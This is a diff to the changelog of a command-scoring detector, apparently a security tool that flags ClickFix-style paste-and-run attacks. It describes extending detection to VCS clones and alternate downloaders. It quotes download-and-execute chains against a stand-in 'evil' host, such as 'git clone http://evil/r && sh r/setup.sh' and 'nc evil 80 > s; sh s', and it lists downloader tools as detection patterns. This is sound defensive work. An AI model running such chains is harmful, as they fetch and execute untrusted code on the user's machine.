@@ -4,6 +4,25 @@ All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https:/
 
 ## [Unreleased]
 
+### Fixed (cycle-484)
+- **VCS-clone / alt-downloader fetch coverage in P12b**: the
+  fake-repo-install ClickFix shape scored 0 —
+  `git clone http://evil/r && sh r/setup.sh`, `git clone …; sh
+  r/install.sh`, and `svn co url && sh x/s` were completely clean
+  because `git` is deliberately needle-free (the single most common
+  benign command, so a bare `git ` name needle would FP flood). The
+  fix keeps `git` name-mentions clean and adds *fetch verbs* to
+  `PASTE_FETCH_TOOLS`: `git clone`, `git pull`, `svn co `,
+  `svn checkout`, `hg clone`, plus the alternate downloaders
+  `aria2c `, `axel `, `lftp `, `rcp `, `wput `, `yafc ` — all verified
+  zero container-word collisions (compound or rare names). The chain
+  gate still requires a `&&/;` exec verb, so benign sequences stay
+  clean: `git clone x`=0, `git clone x && cd x`=0, `git status &&
+  sh x`=0, `git pull && make`=0 (`make` is not an exec-chain verb —
+  only `bash|sh|chmod|sudo|./|/` count). Score 45 (P12b) for pure VCS
+  chains; `hg`/`aria2c`/`axel`/`lftp`/`rcp` chains elevate to 90 via
+  their existing P8 name-mention arms. Suite 24,338 → 24,348 (+10).
+
 ### Fixed (cycle-483)
 - **netcat-family fetch coverage in P2/P12b**: the classic
   `nc host port | sh` and `nc evil 80 > s; sh s` download-execute
